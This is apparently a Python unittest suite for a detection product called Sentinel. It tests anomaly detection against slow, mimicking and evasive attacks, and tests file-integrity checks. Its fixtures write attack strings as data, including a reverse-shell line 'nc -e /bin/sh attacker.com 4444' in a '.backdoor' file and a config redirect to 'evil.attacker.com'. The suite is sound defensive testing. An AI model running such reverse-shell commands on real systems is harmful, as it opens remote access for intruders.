"""
CREATIVE ATTACK TESTS — weird, subtle, and novel. The stuff AV can't catch.
============================================================================
If Sentinel only catches the obvious stuff, it's not worth $2,999/mo.
These test the edge cases that make or break a security product.
"""
import sys, os, time, tempfile, shutil, unittest
import numpy as np
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from gump.sentinel import Sentinel


class TestLowAndSlow(unittest.TestCase):
    """The sophisticated attacker. No spikes. No explosions. Just patience."""

    def test_1_percent_per_hour_cpu_creep(self):
        """CPU rises 1% per reading over 40 readings. 20% → 60%.
        No single reading is alarming. The TREND is the attack."""
        s = Sentinel()
        s.set_baseline({'cpu': {'mean': 20, 'std': 3, 'min': 14, 'max': 28, 'samples': 60}})
        for i in range(40):
            s.feed_metrics({'cpu': 20 + i * 1.0})
        # By now CPU is at 60% — double the baseline mean
        alerts = s.check({'cpu': 60})
        self.assertGreater(len(alerts), 0,
            "FAILED: Missed slow CPU creep from 20% to 60% — the patient attacker wins")

    def test_memory_staircase(self):
        """Memory jumps 5% every 10 readings, holds, jumps again.
        Looks like normal app behavior. But it never comes back down."""
        s = Sentinel()
        s.set_baseline({'memory': {'mean': 50, 'std': 2, 'min': 46, 'max': 55, 'samples': 60}})
        for step in range(5):
            base = 50 + step * 5
            for _ in range(10):
                s.feed_metrics({'memory': base + np.random.randn() * 1})
        # Memory is now at 75% — 25 points above baseline
        alerts = s.check({'memory': 75})
        self.assertGreater(len(alerts), 0,
            "FAILED: Missed staircase memory pattern — 50% → 75% in steps")


class TestMimicry(unittest.TestCase):
    """Attacker mimics normal behavior but with subtle tells."""

    def test_normal_cpu_abnormal_connections(self):
        """CPU looks perfectly normal. But connections doubled.
        Single-metric monitoring misses it. Multi-metric catches it."""
        s = Sentinel()
        s.set_baseline({
            'cpu': {'mean': 20, 'std': 5, 'min': 10, 'max': 35, 'samples': 60},
            'connections': {'mean': 15, 'std': 3, 'min': 8, 'max': 22, 'samples': 60},
        })
        for _ in range(10):
            s.feed_metrics({'cpu': 20 + np.random.randn() * 3, 'connections': 15 + np.random.randn() * 2})
        # Normal CPU, doubled connections
        alerts = s.check({'cpu': 22, 'connections': 45})
        conn_alerts = [a for a in alerts if a['metric'] == 'connections']
        self.assertGreater(len(conn_alerts), 0,
            "FAILED: Missed abnormal connections while CPU looked normal")

    def test_weekend_attack(self):
        """Attacker knows baseline was set on weekday (high activity).
        Attacks on weekend when everything is low — the ABSENCE of activity
        is suspicious if processes suddenly spike from weekend-low to weekday-high."""
        s = Sentinel()
        # Weekday baseline
        s.set_baseline({'processes': {'mean': 300, 'std': 20, 'min': 260, 'max': 350, 'samples': 60}})
        # Weekend: everything is quiet
        for _ in range(10):
            s.feed_metrics({'processes': 180 + np.random.randn() * 5})
        # Attacker spawns processes during quiet period — hits weekday levels
        # This won't trigger vs weekday baseline but something is wrong
        # The regime should shift from the quiet weekend pattern
        alerts = s.check({'processes': 500})
        self.assertGreater(len(alerts), 0,
            "FAILED: Missed process spike during quiet period")


class TestTimeBomb(unittest.TestCase):
    """Malware that waits, then activates."""

    def test_dormant_then_active(self):
        """30 readings of perfect behavior, then sudden multi-metric spike.
        The dormancy makes it trusted. The activation must still trigger."""
        s = Sentinel()
        s.set_baseline({
            'cpu': {'mean': 15, 'std': 3, 'min': 8, 'max': 22, 'samples': 60},
            'network_out': {'mean': 200, 'std': 50, 'min': 80, 'max': 350, 'samples': 60},
            'disk_io': {'mean': 10, 'std': 3, 'min': 3, 'max': 18, 'samples': 60},
        })
        # 30 readings of perfect behavior (dormant)
        for _ in range(30):
            s.feed_metrics({
                'cpu': 15 + np.random.randn() * 2,
                'network_out': 200 + np.random.randn() * 30,
                'disk_io': 10 + np.random.randn() * 2,
            })
        # ACTIVATE — everything spikes simultaneously
        alerts = s.check({'cpu': 92, 'network_out': 15000, 'disk_io': 400})
        self.assertGreaterEqual(len(alerts), 2,
            f"Only {len(alerts)} alerts when time bomb activates — need multiple metrics flagged")


class TestFileBasedAttacks(unittest.TestCase):
    """Attacks that primarily modify files."""

    def test_config_poisoning(self):
        """Attacker subtly modifies a config file — one line changed.
        Not ransomware (mass change), not deletion. Just a tweak."""
        tmpdir = tempfile.mkdtemp()
        config = os.path.join(tmpdir, 'app.conf')
        with open(config, 'w') as f:
            f.write('server=production.internal.com\nport=5432\nssl=true\nlog_level=info\n')

        s = Sentinel()
        s.watch_files([config])

        # Attacker changes server to their C2
        with open(config, 'w') as f:
            f.write('server=evil.attacker.com\nport=5432\nssl=true\nlog_level=info\n')

        changes = s.check_integrity()
        shutil.rmtree(tmpdir)
        self.assertGreater(len(changes), 0,
            "FAILED: Missed single-line config poisoning")

    def test_new_cron_job(self):
        """Attacker drops a new file (persistence mechanism)."""
        tmpdir = tempfile.mkdtemp()
        # Watch the directory
        existing = os.path.join(tmpdir, 'backup.cron')
        with open(existing, 'w') as f:
            f.write('0 3 * * * /usr/bin/backup.sh')

        s = Sentinel()
        s.watch_files([tmpdir])

        # Attacker drops new cron job
        with open(os.path.join(tmpdir, 'reverse_shell.cron'), 'w') as f:
            f.write('*/5 * * * * /tmp/.hidden/shell.sh')

        changes = s.check_integrity()
        shutil.rmtree(tmpdir)
        new_files = [c for c in changes if c['type'] == 'new_file']
        self.assertGreater(len(new_files), 0,
            "FAILED: Missed new file dropped in monitored directory")

    def test_hidden_file(self):
        """Attacker creates a dotfile (hidden) in a monitored directory."""
        tmpdir = tempfile.mkdtemp()
        legit = os.path.join(tmpdir, 'data.csv')
        with open(legit, 'w') as f:
            f.write('id,name,value\n1,test,100')

        s = Sentinel()
        s.watch_files([tmpdir])

        # Attacker drops hidden file
        with open(os.path.join(tmpdir, '.backdoor'), 'w') as f:
            f.write('#!/bin/bash\nnc -e /bin/sh attacker.com 4444')

        changes = s.check_integrity()
        shutil.rmtree(tmpdir)
        new_files = [c for c in changes if c['type'] == 'new_file']
        self.assertGreater(len(new_files), 0,
            "FAILED: Missed hidden dotfile in monitored directory")


class TestEvasion(unittest.TestCase):
    """Attacker tries to evade detection."""

    def test_oscillating_attack(self):
        """Attacker spikes, drops, spikes, drops — trying to look like noise.
        But the VARIANCE changes. Baseline std was 3, now it's 30."""
        s = Sentinel()
        s.set_baseline({'cpu': {'mean': 20, 'std': 3, 'min': 14, 'max': 28, 'samples': 60}})
        # Oscillating: 5, 90, 8, 85, 12, 92, 7, 88
        for val in [5, 90, 8, 85, 12, 92, 7, 88, 5, 95]:
            s.feed_metrics({'cpu': val})
        # The peaks are the attack; the mean might be close to baseline
        # but any single peak triggers
        alerts = s.check({'cpu': 95})
        self.assertGreater(len(alerts), 0,
            "FAILED: Oscillating attack evaded detection")

    def test_just_below_threshold(self):
        """Attacker keeps metrics just below what they think the threshold is.
        CPU baseline mean=20, std=5. Attacker runs at 32 (2.4σ — below typical 3σ).
        Should we catch it? At 2.5σ threshold, yes."""
        s = Sentinel()
        s.set_baseline({'cpu': {'mean': 20, 'std': 5, 'min': 10, 'max': 35, 'samples': 60}})
        for _ in range(10):
            s.feed_metrics({'cpu': 20 + np.random.randn() * 3})
        # Attacker at 2.6σ — should be MEDIUM severity
        alerts = s.check({'cpu': 33})
        medium_plus = [a for a in alerts if a.get('severity') in ('MEDIUM', 'HIGH', 'CRITICAL')]
        self.assertGreater(len(medium_plus), 0,
            "FAILED: Attacker at 2.6σ evaded all detection — threshold too high")


class TestActiveDefenseCreative(unittest.TestCase):
    """Creative active defense scenarios."""

    def test_predict_lateral_movement(self):
        """Attacker hit server A, then server B. Tension predicts server C."""
        s = Sentinel()
        attack = [
            {'source': 'attacker', 'target': 'web_server', 'intensity': 1},
            {'source': 'web_server', 'target': 'app_server', 'intensity': 3},
            {'source': 'app_server', 'target': 'db_replica', 'intensity': 5},
        ]
        profile = s.profile_intruder(attack)
        # Should predict targets connected to what they've already hit
        self.assertGreater(len(profile['predicted_targets']), 0,
            "FAILED: Couldn't predict lateral movement targets")

    def test_returning_attacker_recognized(self):
        """Same attack pattern from different source = same fingerprint."""
        s = Sentinel()
        # First attack from IP 1.2.3.4
        pattern1 = [
            {'source': '1.2.3.4', 'target': '/etc/passwd', 'intensity': 1},
            {'source': '1.2.3.4', 'target': '/var/log', 'intensity': 2},
            {'source': '1.2.3.4', 'target': '/root/.ssh', 'intensity': 5},
        ]
        # Same attack from IP 5.6.7.8 (different IP, VPN/proxy)
        pattern2 = [
            {'source': '5.6.7.8', 'target': '/etc/passwd', 'intensity': 1},
            {'source': '5.6.7.8', 'target': '/var/log', 'intensity': 2},
            {'source': '5.6.7.8', 'target': '/root/.ssh', 'intensity': 5},
        ]
        # Fingerprint should match on the TARGET pattern, not the source
        fp1 = s.spectral_fingerprint([a['target'] for a in pattern1])
        fp2 = s.spectral_fingerprint([a['target'] for a in pattern2])
        self.assertEqual(fp1['fingerprint'], fp2['fingerprint'],
            "FAILED: Same attack from different IP not recognized as same attacker")


class TestFalsePositiveEdge(unittest.TestCase):
    """Legitimate events that LOOK like attacks."""

    def test_deployment_spike(self):
        """App deployment: CPU spikes, processes restart, connections drop then surge.
        This is legitimate but looks like an attack.
        We SHOULD alert (can't know intent), but at MEDIUM not CRITICAL."""
        s = Sentinel()
        s.set_baseline({
            'cpu': {'mean': 20, 'std': 5, 'min': 10, 'max': 35, 'samples': 60},
            'processes': {'mean': 280, 'std': 15, 'min': 250, 'max': 320, 'samples': 60},
        })
        for _ in range(10):
            s.feed_metrics({'cpu': 20 + np.random.randn() * 3, 'processes': 280 + np.random.randn() * 10})
        # Deploy: CPU hits 70% (building), processes restart (drop then surge)
        alerts = s.check({'cpu': 70, 'processes': 310})
        # CPU should alert (70% from baseline 20%), processes should NOT (310 is within range)
        cpu_alerts = [a for a in alerts if a['metric'] == 'cpu']
        proc_alerts = [a for a in alerts if a['metric'] == 'processes' and a['severity'] in ('HIGH', 'CRITICAL')]
        self.assertGreater(len(cpu_alerts), 0, "Should flag deployment CPU spike")
        self.assertEqual(len(proc_alerts), 0,
            "Processes at 310 (baseline 280±15) should NOT be HIGH/CRITICAL — it's a deploy")

    def test_backup_job(self):
        """Nightly backup: disk I/O maxes, network_out spikes.
        Legitimate but looks like exfil + ransomware."""
        s = Sentinel()
        s.set_baseline({
            'disk_io': {'mean': 10, 'std': 5, 'min': 2, 'max': 25, 'samples': 60},
        })
        for _ in range(10):
            s.feed_metrics({'disk_io': 10 + np.random.randn() * 3})
        # Backup runs: disk I/O spikes
        alerts = s.check({'disk_io': 80})
        # SHOULD alert — we can't know it's a backup vs ransomware
        # But the severity should reflect that it's one metric, not multi-metric
        self.assertGreater(len(alerts), 0,
            "Should detect disk I/O spike even if it's a backup")


if __name__ == '__main__':
    unittest.main(verbosity=2)
